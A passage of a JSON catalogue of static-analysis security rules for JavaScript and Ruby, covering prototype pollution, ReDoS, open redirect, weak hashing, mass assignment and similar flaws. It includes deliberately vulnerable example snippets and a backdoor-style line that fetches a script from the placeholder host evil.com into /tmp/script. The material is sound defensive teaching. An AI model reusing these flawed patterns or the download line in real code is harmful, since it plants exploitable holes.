Mitre.org: [CWE-377](https://cwe.mitre.org/data/definitions/377.html).\n* NPM: [tmp](https://www.npmjs.com/package/tmp).\n* Common Weakness Enumeration: [CWE-377](https://cwe.mitre.org/data/definitions/377.html).\n* Common Weakness Enumeration: [CWE-378](https://cwe.mitre.org/data/definitions/378.html).\n"
  },
  "js/prototype-polluting-assignment": {
    "name": "Prototype-polluting assignment",
    "description": "Modifying an object obtained via a user-controlled property name may lead to accidental mutation of the built-in Object prototype, and possibly escalate to remote code execution or cross-site scripting.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "high",
    "id": "js/prototype-polluting-assignment",
    "tags": [
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-079",
      "external/cwe/cwe-094",
      "external/cwe/cwe-400",
      "external/cwe/cwe-471",
      "external/cwe/cwe-915"
    ],
    "filename": "cffa8a05-PrototypePollutingAssignment",
    "language": "javascript",
    "help": "# Prototype-polluting assignment\nMost JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype` object, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.\n\nOne way to cause prototype pollution is by modifying an object obtained via a user-controlled property name. Most objects have a special `__proto__` property that refers to `Object.prototype`. An attacker can abuse this special property to trick the application into performing unintended modifications of `Object.prototype`.\n\n\n## Recommendation\nUse an associative data structure that is resilient to untrusted key values, such as a [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map). In some cases, a prototype-less object created with [Object.create(null)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/create) may be preferable.\n\nAlternatively, restrict the computed property name so it can't clash with a built-in property, either by prefixing it with a constant string, or by rejecting inputs that don't conform to the expected format.\n\n\n## Example\nIn the example below, the untrusted value `req.params.id` is used as the property name `req.session.todos[id]`. If a malicious user passes in the ID value `__proto__`, the variable `items` will then refer to `Object.prototype`. Finally, the modification of `items` then allows the attacker to inject arbitrary properties onto `Object.prototype`.\n\n\n```javascript\nlet express = require('express');\nlet app = express()\n\napp.put('/todos/:id', (req, res) => {\n    let id = req.params.id;\n    let items = req.session.todos[id];\n    if (!items) {\n        items = req.session.todos[id] = {};\n    }\n    items[req.query.name] = req.query.text;\n    res.end(200);\n});\n\n```\nOne way to fix this is to use [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map) objects to associate key/value pairs instead of regular objects, as shown below:\n\n\n```javascript\nlet express = require('express');\nlet app = express()\n\napp.put('/todos/:id', (req, res) => {\n    let id = req.params.id;\n    let items = req.session.todos.get(id);\n    if (!items) {\n        items = new Map();\n        req.sessions.todos.set(id, items);\n    }\n    items.set(req.query.name, req.query.text);\n    res.end(200);\n});\n\n```\nAnother way to fix it is to prevent the `__proto__` property from being used as a key, as shown below:\n\n\n```javascript\nlet express = require('express');\nlet app = express()\n\napp.put('/todos/:id', (req, res) => {\n    let id = req.params.id;\n    if (id === '__proto__' || id === 'constructor' || id === 'prototype') {\n        res.end(403);\n        return;\n    }\n    let items = req.session.todos[id];\n    if (!items) {\n        items = req.session.todos[id] = {};\n    }\n    items[req.query.name] = req.query.text;\n    res.end(200);\n});\n\n```\n\n## References\n* MDN: [Object.prototype.__proto__](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto)\n* MDN: [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map)\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n* Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).\n* Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).\n"
  },
  "js/count-untrusted-data-external-api": {
    "name": "Frequency counts for external APIs that are used with untrusted data",
    "description": "This reports the external APIs that are used with untrusted data, along with how frequently the API is called, and how many unique sources of untrusted data flow to it.",
    "id": "js/count-untrusted-data-external-api",
    "kind": "table",
    "tags": [
      "security external/cwe/cwe-20"
    ],
    "filename": "bc247e13-ExternalAPIsUsedWithUntrustedData",
    "language": "javascript",
    "help": "# Frequency counts for external APIs that are used with untrusted data\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports all external APIs that are used with untrusted data, along with how frequently the API is used, and how many unique sources of untrusted data flow to this API. This query is designed primarily to help identify which APIs may be relevant for security analysis of this application.\n\nAn external API is defined as a call to a function that is not defined in the source code, not overridden in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the third party dependencies or from internal dependencies. The query will report the external package name, followed by an access path leading to the function, followed by `[param x]` where `x` indicates the position of the parameter receiving the untrusted data.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights a known sink, no action is required.\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query.\n* If the result represents a call to an external API which transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIMethod` class to exclude known safe external APIs from future analysis.\n\n\n## Example\nIf the query were to return the API `express().get.[callback].[param 'res'].send() [param 0]`, this could correspond to the `X` in `express().get('/foo', (req, res) => res.send(X))`. First we should consider whether this a security relevant sink. In this case, this is writing to a HTTP response, so we should consider whether this is an XSS sink. If it is, we should confirm that it is handled by the reflected XSS query.\n\nIf the query were to return the API `url.parse java.lang.StringBuilder.append(java.lang.String) [param 0]`, then this should be reviewed as a possible taint step, because tainted data would flow from the 0th argument to the qualifier of the call.\n\nNote that both examples are correctly handled by the standard taint tracking library and XSS query.\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "rb/polynomial-redos": {
    "name": "Polynomial regular expression used on uncontrolled data",
    "description": "A regular expression that can require polynomial time to match may be vulnerable to denial-of-service attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "rb/polynomial-redos",
    "tags": [
      "security",
      "external/cwe/cwe-1333",
      "external/cwe/cwe-730",
      "external/cwe/cwe-400"
    ],
    "filename": "23705fa4-PolynomialReDoS",
    "language": "ruby",
    "help": "# Polynomial regular expression used on uncontrolled data\nSome regular expressions take a long time to match certain input strings to the point where the time it takes to match a string of length *n* is proportional to *n<sup>k</sup>* or even *2<sup>n</sup>*. Such regular expressions can negatively affect performance, or even allow a malicious user to perform a Denial of Service (\"DoS\") attack by crafting an expensive input string for the regular expression to match.\n\nThe regular expression engine used by the Ruby interpreter (MRI) uses backtracking non-deterministic finite automata to implement regular expression matching. While this approach is space-efficient and allows supporting advanced features like capture groups, it is not time-efficient in general. The worst-case time complexity of such an automaton can be polynomial or even exponential, meaning that for strings of a certain shape, increasing the input length by ten characters may make the automaton about 1000 times slower.\n\nNote that Ruby 3.2 and later have implemented a caching mechanism that completely eliminates the worst-case time complexity for the regular expressions flagged by this query. The regular expressions flagged by this query are therefore only problematic for Ruby versions prior to 3.2.\n\nTypically, a regular expression is affected by this problem if it contains a repetition of the form `r*` or `r+` where the sub-expression `r` is ambiguous in the sense that it can match some string in multiple ways. More information about the precise circumstances can be found in the references.\n\n\n## Recommendation\nModify the regular expression to remove the ambiguity, or ensure that the strings matched with the regular expression are short enough that the time-complexity does not matter.\n\n\n## Example\nConsider this use of a regular expression, which removes all leading and trailing whitespace in a string:\n\n```ruby\n\ntext.gsub!(/^\\s+|\\s+$/, '') # BAD\n```\nThe sub-expression `\"\\s+$\"` will match the whitespace characters in `text` from left to right, but it can start matching anywhere within a whitespace sequence. This is problematic for strings that do **not** end with a whitespace character. Such a string will force the regular expression engine to process each whitespace sequence once per whitespace character in the sequence.\n\nThis ultimately means that the time cost of trimming a string is quadratic in the length of the string. So a string like `\"a b\"` will take milliseconds to process, but a similar string with a million spaces instead of just one will take several minutes.\n\nAvoid this problem by rewriting the regular expression to not contain the ambiguity about when to start matching whitespace sequences. For instance, by using a negative look-behind (`/^\\s+|(?<!\\s)\\s+$/`), or just by using the built-in strip method (`text.strip!`).\n\nNote that the sub-expression `\"^\\s+\"` is **not** problematic as the `^` anchor restricts when that sub-expression can start matching, and as the regular expression engine matches from left to right.\n\n\n## Example\nAs a similar, but slightly subtler problem, consider the regular expression that matches lines with numbers, possibly written using scientific notation:\n\n```ruby\n\n/^0\\.\\d+E?\\d+$/ # BAD\n```\nThe problem with this regular expression is in the sub-expression `\\d+E?\\d+` because the second `\\d+` can start matching digits anywhere after the first match of the first `\\d+` if there is no `E` in the input string.\n\nThis is problematic for strings that do **not** end with a digit. Such a string will force the regular expression engine to process each digit sequence once per digit in the sequence, again leading to a quadratic time complexity.\n\nTo make the processing faster, the regular expression should be rewritten such that the two `\\d+` sub-expressions do not have overlapping matches: `/^0\\.\\d+(E\\d+)?$/`.\n\n\n## Example\nSometimes it is unclear how a regular expression can be rewritten to avoid the problem. In such cases, it often suffices to limit the length of the input string. For instance, the following regular expression is used to match numbers, and on some non-number inputs it can have quadratic time complexity:\n\n```ruby\n\nis_matching = /^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.match?(str)\n```\nIt is not immediately obvious how to rewrite this regular expression to avoid the problem. However, you can mitigate performance issues by limiting the length to 1000 characters, which will always finish in a reasonable amount of time.\n\n```ruby\n\nif str.length > 1000\n    raise ArgumentError, \"Input too long\"\nend\n\nis_matching = /^(\\+|-)?(\\d+|(\\d*\\.\\d*))?(E|e)?([-+])?(\\d+)?$/.match?(str)\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Wikipedia: [Time complexity](https://en.wikipedia.org/wiki/Time_complexity).\n* James Kirrage, Asiri Rathnayake, Hayo Thielecke: [Static Analysis for Regular Expression Denial-of-Service Attack](https://arxiv.org/abs/1301.0849).\n* Common Weakness Enumeration: [CWE-1333](https://cwe.mitre.org/data/definitions/1333.html).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "rb/incomplete-url-substring-sanitization": {
    "name": "Incomplete URL substring sanitization",
    "description": "Security checks on the substrings of an unparsed URL are often vulnerable to bypassing.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "rb/incomplete-url-substring-sanitization",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020"
    ],
    "filename": "61d13630-IncompleteUrlSubstringSanitization",
    "language": "ruby",
    "help": "# Incomplete URL substring sanitization\nSanitizing untrusted URLs is an important technique for preventing attacks such as request forgeries and malicious redirections. Usually, this is done by checking that the host of a URL is in a set of allowed hosts.\n\nHowever, treating the URL as a string and checking if one of the allowed hosts is a substring of the URL is very prone to errors. Malicious URLs can bypass such security checks by embedding one of the allowed hosts in an unexpected location.\n\nEven if the substring check is not used in a security-critical context, the incomplete check may still cause undesirable behaviors when the check succeeds accidentally.\n\n\n## Recommendation\nParse a URL before performing a check on its host value, and ensure that the check handles arbitrary subdomain sequences correctly.\n\n\n## Example\nThe following example code checks that a URL redirection will reach the `example.com` domain, or one of its subdomains, and not some malicious site.\n\n\n```ruby\nclass AppController < ApplicationController\n    def index\n        url = params[:url]\n        # BAD: the host of `url` may be controlled by an attacker\n        if url.include?(\"example.com\")\n            redirect_to url\n        end\n    end\nend\n```\nThe substring check is, however, easy to bypass. For example by embedding `example.com` in the path component: `http://evil-example.net/example.com`, or in the query string component: `http://evil-example.net/?x=example.com`. Address these shortcomings by checking the host of the parsed URL instead:\n\n\n```ruby\nclass AppController < ApplicationController\n    def index\n        url = params[:url]\n        host = URI(url).host\n        # BAD: the host of `url` may be controlled by an attacker\n        if host.include?(\"example.com\")\n            redirect_to url\n        end\n    end\nend\n\n```\nThis is still not a sufficient check as the following URLs bypass it: `http://evil-example.com` `http://example.com.evil-example.net`. Instead, use an explicit whitelist of allowed hosts to make the redirect secure:\n\n\n```ruby\nclass AppController < ApplicationController\n    def index\n        url = params[:url]\n        host = URI(url).host\n        # GOOD: the host of `url` can not be controlled by an attacker\n        allowedHosts = [\n            'example.com',\n            'beta.example.com',\n            'www.example.com'\n        ]\n        if allowedHosts.include?(host)\n            redirect_to url\n        end\n    end\nend\n\n```\n\n## References\n* OWASP: [SSRF](https://www.owasp.org/index.php/Server_Side_Request_Forgery)\n* OWASP: [XSS Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "rb/weak-sensitive-data-hashing": {
    "name": "Use of a broken or weak cryptographic hashing algorithm on sensitive data",
    "description": "Using broken or weak cryptographic hashing algorithms can compromise security.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "rb/weak-sensitive-data-hashing",
    "tags": [
      "security",
      "external/cwe/cwe-327",
      "external/cwe/cwe-328",
      "external/cwe/cwe-916"
    ],
    "filename": "8dbb4ef0-WeakSensitiveDataHashing",
    "language": "ruby",
    "help": "# Use of a broken or weak cryptographic hashing algorithm on sensitive data\nUsing a broken or weak cryptographic hash function can leave data vulnerable, and should not be used in security related code.\n\nA strong cryptographic hash function should be resistant to:\n\n* pre-image attacks: if you know a hash value `h(x)`, you should not be able to easily find the input `x`.\n* collision attacks: if you know a hash value `h(x)`, you should not be able to easily find a different input `y` with the same hash value `h(x) = h(y)`.\nIn cases with a limited input space, such as for passwords, the hash function also needs to be computationally expensive to be resistant to brute-force attacks. Passwords should also have an unique salt applied before hashing, but that is not considered by this query.\n\nAs an example, both MD5 and SHA-1 are known to be vulnerable to collision attacks.\n\nSince it's OK to use a weak cryptographic hash function in a non-security context, this query only alerts when these are used to hash sensitive data (such as passwords, certificates, usernames).\n\nUse of broken or weak cryptographic algorithms that are not hashing algorithms, is handled by the `rb/weak-cryptographic-algorithm` query.\n\n\n## Recommendation\nEnsure that you use a strong, modern cryptographic hash function:\n\n* such as Argon2, scrypt, bcrypt, or PBKDF2 for passwords and other data with limited input space.\n* such as SHA-2, or SHA-3 in other cases.\n\n## Example\nThe following example shows two functions for checking whether the hash of a certificate matches a known value -- to prevent tampering. The first function uses MD5 that is known to be vulnerable to collision attacks. The second function uses SHA-256 that is a strong cryptographic hashing function.\n\n\n```ruby\nrequire 'openssl'\n\ndef certificate_matches_known_hash_bad(certificate, known_hash)\n  hash = OpenSSL::Digest.new('SHA1').digest certificate\n  hash == known_hash\nend\n\ndef certificate_matches_known_hash_good(certificate, known_hash)\n  hash = OpenSSL::Digest.new('SHA256').digest certificate\n  hash == known_hash\nend\n\n```\n\n## Example\nThe following example shows two functions for hashing passwords. The first function uses SHA-256 to hash passwords. Although SHA-256 is a strong cryptographic hash function, it is not suitable for password hashing since it is not computationally expensive.\n\n\n```ruby\nrequire 'openssl'\n\ndef get_password_hash(password, salt)\n  OpenSSL::Digest.new('SHA256').digest(password + salt) # BAD\nend\n\n```\nThe second function uses Argon2 (through the `argon2` gem), which is a strong password hashing algorithm (and includes a per-password salt by default).\n\n\n```ruby\nrequire 'argon2'\n\ndef get_initial_hash(password)\n  Argon2::Password.create(password)\nend\n\ndef check_password(password, known_hash)\n  Argon2::Password.verify_password(password, known_hash)\nend\n\n```\n\n## References\n* OWASP: [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html)\n* Common Weakness Enumeration: [CWE-327](https://cwe.mitre.org/data/definitions/327.html).\n* Common Weakness Enumeration: [CWE-328](https://cwe.mitre.org/data/definitions/328.html).\n* Common Weakness Enumeration: [CWE-916](https://cwe.mitre.org/data/definitions/916.html).\n"
  },
  "rb/clear-text-logging-sensitive-data": {
    "name": "Clear-text logging of sensitive information",
    "description": "Logging sensitive information without encryption or hashing can expose it to an attacker.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "rb/clear-text-logging-sensitive-data",
    "tags": [
      "security",
      "external/cwe/cwe-312",
      "external/cwe/cwe-359",
      "external/cwe/cwe-532"
    ],
    "filename": "19fd7075-CleartextLogging",
    "language": "ruby",
    "help": "# Clear-text logging of sensitive information\nSensitive information that is stored unencrypted is accessible to an attacker who gains access to the storage.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted before being stored.\n\nIn general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\nBe aware that external processes often store the `standard out` and `standard error` streams of the application, causing logged sensitive information to be stored as well.\n\n\n## Example\nThe following example code logs user credentials (in this case, their password) to `standard out` in plaintext:\n\n\n```ruby\nrequire 'Logger'\n\nclass UserSession\n  @@logger = Logger.new STDOUT\n\n  def login(username, password)\n    # ...\n    @@logger.info \"login with password: #{password})\"\n  end\nend\n\n```\nInstead, the credentials should be masked or redacted before logging:\n\n\n```ruby\nrequire 'Logger'\n\nclass UserSession\n  @@logger = Logger.new STDOUT\n\n  def login(username, password)\n    # ...\n    password_escaped = password.sub(/.*/, \"[redacted]\")\n    @@logger.info \"login with password: #{password_escaped})\"\n  end\nend\n\n```\n\n## References\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* Common Weakness Enumeration: [CWE-312](https://cwe.mitre.org/data/definitions/312.html).\n* Common Weakness Enumeration: [CWE-359](https://cwe.mitre.org/data/definitions/359.html).\n* Common Weakness Enumeration: [CWE-532](https://cwe.mitre.org/data/definitions/532.html).\n"
  },
  "rb/url-redirection": {
    "name": "URL redirection from remote source",
    "description": "URL redirection based on unvalidated user input may cause redirection to malicious web sites.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 6.1,
    "sub-severity": "low",
    "id": "rb/url-redirection",
    "tags": [
      "security",
      "external/cwe/cwe-601"
    ],
    "precision": "high",
    "filename": "10326a9f-UrlRedirect",
    "language": "ruby",
    "help": "# URL redirection from remote source\nDirectly incorporating user input into a URL redirect request without validating the input can facilitate phishing attacks. In these attacks, unsuspecting users can be redirected to a malicious site that looks very similar to the real site they intend to visit, but which is controlled by the attacker.\n\n\n## Recommendation\nTo guard against untrusted URL redirection, it is advisable to avoid putting user input directly into a redirect URL. Instead, maintain a list of authorized redirects on the server; then choose from that list based on the user input provided.\n\nIf this is not possible, then the user input should be validated in some other way, for example, by verifying that the target URL is on the same host as the current page.\n\n\n## Example\nThe following example shows an HTTP request parameter being used directly in a URL redirect without validating the input, which facilitates phishing attacks:\n\n\n```ruby\nclass HelloController < ActionController::Base\n  def hello\n    redirect_to params[:url]\n  end\nend\n\n```\nOne way to remedy the problem is to validate the user input against a set of known fixed strings before doing the redirection:\n\n\n```ruby\nclass HelloController < ActionController::Base\n  VALID_REDIRECTS = [\n    \"http://cwe.mitre.org/data/definitions/601.html\",\n    \"http://cwe.mitre.org/data/definitions/79.html\"\n  ].freeze\n\n  def hello\n    # GOOD: the request parameter is validated against a known list of URLs\n    target_url = params[:url]\n    if VALID_REDIRECTS.include?(target_url)\n      redirect_to target_url\n    else\n      redirect_to \"/error.html\"\n    end\n  end\nend\n```\nAlternatively, we can check that the target URL does not redirect to a different host by checking that the URL is either relative or on a known good host:\n\n\n```ruby\nrequire 'uri'\n\nclass HelloController < ActionController::Base\n  KNOWN_HOST = \"example.org\"\n\n  def hello\n    begin\n      target_url = URI.parse(params[:url])\n\n      # Redirect if the URL is either relative or on a known good host\n      if !target_url.host || target_url.host == KNOWN_HOST\n        redirect_to target_url.to_s\n      else\n        redirect_to \"/error.html\" # Redirect to error page if the host is not known\n      end\n    rescue URI::InvalidURIError\n      # Handle the exception, for example, by redirecting to a safe page\n      redirect_to \"/error.html\"\n    end\n  end\nend\n```\nNote that as written, the above code will allow redirects to URLs on `example.com`, which is harmless but perhaps not intended. You can substitute your own domain (if known) for `example.com` to prevent this.\n\n\n## References\n* OWASP: [ Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html).\n* Rails Guides: [Redirection and Files](https://guides.rubyonrails.org/security.html#redirection-and-files).\n* Common Weakness Enumeration: [CWE-601](https://cwe.mitre.org/data/definitions/601.html).\n"
  },
  "rb/incomplete-sanitization": {
    "name": "Incomplete string escaping or encoding",
    "description": "A string transformer that does not replace or escape all occurrences of a meta-character may be ineffective.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "precision": "high",
    "id": "rb/incomplete-sanitization",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-020",
      "external/cwe/cwe-080",
      "external/cwe/cwe-116"
    ],
    "filename": "a0047167-IncompleteSanitization",
    "language": "ruby",
    "help": "# Incomplete string escaping or encoding\nSanitizing untrusted input is a common technique for preventing injection attacks such as SQL injection or cross-site scripting. Usually, this is done by escaping meta-characters such as quotes in a domain-specific way so that they are treated as normal characters.\n\nHowever, directly using the `String#sub` method to perform escaping is notoriously error-prone. Common mistakes include only replacing the first occurrence of a meta-character, or backslash-escaping various meta-characters but not the backslash itself.\n\nIn the former case, later meta-characters are left undisturbed and can be used to subvert the sanitization. In the latter case, preceding a meta-character with a backslash leads to the backslash being escaped, but the meta-character appearing un-escaped, which again makes the sanitization ineffective.\n\nEven if the escaped string is not used in a security-critical context, incomplete escaping may still have undesirable effects, such as badly rendered or confusing output.\n\n\n## Recommendation\nUse a (well-tested) sanitization library if at all possible. These libraries are much more likely to handle corner cases correctly than a custom implementation.\n\nAn even safer alternative is to design the application so that sanitization is not needed. Otherwise, make sure to use `String#gsub` rather than `String#sub`, to ensure that all occurrences are replaced, and remember to escape backslashes if applicable.\n\n\n## Example\nAs an example, assume that we want to embed a user-controlled string `account_number` into a SQL query as part of a string literal. To avoid SQL injection, we need to ensure that the string does not contain un-escaped single-quote characters. The following method attempts to ensure this by doubling single quotes, and thereby escaping them:\n\n\n```ruby\ndef escape_quotes(s)\n  s.sub \"'\", \"''\"\nend\n```\nAs written, this sanitizer is ineffective: `String#sub` will replace only the *first* occurrence of that string.\n\nAs mentioned above, the method `escape_quotes` should be replaced with a purpose-built sanitizer, such as `ActiveRecord::Base::sanitize_sql` in Rails, or by using ORM methods that automatically sanitize parameters.\n\nIf this is not an option, `escape_quotes` should be rewritten to use the `String#gsub` method instead:\n\n\n```ruby\ndef escape_quotes(s)\n  s.gsub \"'\", \"''\"\nend\n```\n\n## References\n* OWASP Top 10: [A1 Injection](https://www.owasp.org/index.php/Top_10-2017_A1-Injection).\n* Rails: [ActiveRecord::Base::sanitize_sql](https://api.rubyonrails.org/classes/ActiveRecord/Sanitization/ClassMethods.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n* Common Weakness Enumeration: [CWE-80](https://cwe.mitre.org/data/definitions/80.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
  },
  "rb/http-to-file-access": {
    "name": "Network data written to file",
    "description": "Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.3,
    "precision": "medium",
    "id": "rb/http-to-file-access",
    "tags": [
      "security",
      "external/cwe/cwe-912",
      "external/cwe/cwe-434"
    ],
    "filename": "65e2599d-HttpToFileAccess",
    "language": "ruby",
    "help": "# Network data written to file\nStoring user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example shows backdoor code that downloads data from the URL `https://evil.com/script`, and stores it in the local file `/tmp/script`.\n\n\n```ruby\nrequire \"net/http\"\n\nresp = Net::HTTP.new(\"evil.com\").get(\"/script\").body\nfile = File.open(\"/tmp/script\", \"w\")\nfile.write(body)\n```\nOther parts of the program might then assume that since `/tmp/script` is a local file its contents can be trusted, while in fact they are obtained from an untrusted remote source.\n\n\n## References\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* OWASP: [Unrestricted File Upload](https://www.owasp.org/index.php/Unrestricted_File_Upload).\n* Common Weakness Enumeration: [CWE-912](https://cwe.mitre.org/data/definitions/912.html).\n* Common Weakness Enumeration: [CWE-434](https://cwe.mitre.org/data/definitions/434.html).\n"
  },
  "rb/non-constant-kernel-open": {
    "name": "Use of `Kernel.open` or `IO.read` or similar sinks with a non-constant value",
    "description": "Using `Kernel.open`, `IO.read`, `IO.write`, `IO.binread`, `IO.binwrite`, `IO.foreach`, `IO.readlines`, or `URI.open` may allow a malicious user to execute arbitrary system commands.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 9.8,
    "precision": "high",
    "id": "rb/non-constant-kernel-open",
    "tags": [
      "correctness",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-088",
      "external/cwe/cwe-073"
    ],
    "filename": "1a9e74f4-NonConstantKernelOpen",
    "language": "ruby",
    "help": "# Use of `Kernel.open` or `IO.read` or similar sinks with a non-constant value\nIf `Kernel.open` is given a file name that starts with a `|` character, it will execute the remaining string as a shell command. If a malicious user can control the file name, they can execute arbitrary code. The same vulnerability applies to `IO.read`, `IO.write`, `IO.binread`, `IO.binwrite`, `IO.foreach`, `IO.readlines` and `URI.open`.\n\n\n## Recommendation\nUse `File.open` instead of `Kernel.open`, as the former does not have this vulnerability. Similarly, use the methods from the `File` class instead of the `IO` class e.g. `File.read` instead of `IO.read`.\n\nInstead of `URI.open` use `URI(..).open` or an HTTP Client.\n\n\n## Example\nThe following example shows code that calls `Kernel.open` on a user-supplied file path.\n\n\n```ruby\nrequire \"open-uri\"\n\nclass UsersController < ActionController::Base\n  def create\n    filename = params[:filename]\n    open(filename) # BAD\n\n    web_page = params[:web_page]\n    URI.open(web_page) # BAD - calls `Kernel.open` internally\n  end\nend\n\n```\nInstead, `File.open` should be used, as in the following example.\n\n\n```ruby\nclass UsersController < ActionController::Base\n  def create\n    filename = params[:filename]\n    File.open(filename)\n\n    web_page = params[:web_page]\n    Net::HTTP.get(URI.parse(web_page))\n  end\nend\n\n```\n\n## References\n* OWASP: [Command Injection](https://www.owasp.org/index.php/Command_Injection). [Ruby on Rails Cheat Sheet: Command Injection](https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html#command-injection).\n* Example CVE: [Command Injection in RDoc](https://www.ruby-lang.org/en/news/2021/05/02/os-command-injection-in-rdoc/).\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-88](https://cwe.mitre.org/data/definitions/88.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n"
  },
  "rb/insecure-mass-assignment": {
    "name": "Insecure Mass Assignment",
    "description": "Using mass assignment with user-controlled attributes allows unintended parameters to be set.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 9.8,
    "precision": "high",
    "id": "rb/insecure-mass-assignment",
    "tags": [
      "security",
      "external/cwe/cwe-915"
    ],
    "filename": "461d2752-MassAssignment",
    "language": "ruby",
    "help": "# Insecure Mass Assignment\nOperations that allow for mass assignment (setting multiple attributes of an object using a hash), such as `ActiveRecord::Base.new`, should take care not to allow arbitrary parameters to be set by the user. Otherwise, unintended attributes may be set, such as an `is_admin` field for a `User` object.\n\n\n## Recommendation\nWhen using a mass assignment operation from user supplied parameters, use `ActionController::Parameters#permit` to restrict the possible parameters a user can supply, rather than `ActionController::Parameters#permit!`, which permits arbitrary parameters to be used for mass assignment.\n\n\n## Example\nIn the following example, `permit!` is used which allows arbitrary parameters to be supplied by the user.\n\n\n```ruby\nclass UserController < ActionController::Base\n    def create\n        # BAD: arbitrary params are permitted to be used for this assignment\n        User.new(user_params).save!\n    end\n\n    def user_params\n        params.require(:user).permit!\n    end\nend\n```\n\n\nIn the following example, only specific parameters are permitted, so the mass assignment is safe.\n\n\n```ruby\nclass UserController < ActionController::Base\n    def create\n        # GOOD: the permitted parameters are explicitly specified\n        User.new(user_params).save!\n    end\n\n    def user_params\n        params.require(:user).permit(:name, :email)\n    end\nend\n```\n\n## References\n* Rails guides: [Strong Parameters](https://guides.rubyonrails.org/action_controller_overview.html#strong-parameters).\n* Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).\n"
  },
  "rb/overly-permissive-file": {
    "name": "Overly permissive file permissions",
    "description": "Allowing files to be readable or writable by users other than the owner may allow sensitive information to be accessed.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.8,
    "id": "rb/overly-permissive-file",
    "tags": [
      "external/cwe/cwe-732",
      "security"
    ],
    "precision": "low",
    "filename": "b9da5639-WeakFilePermissions",
    "language": "ruby",
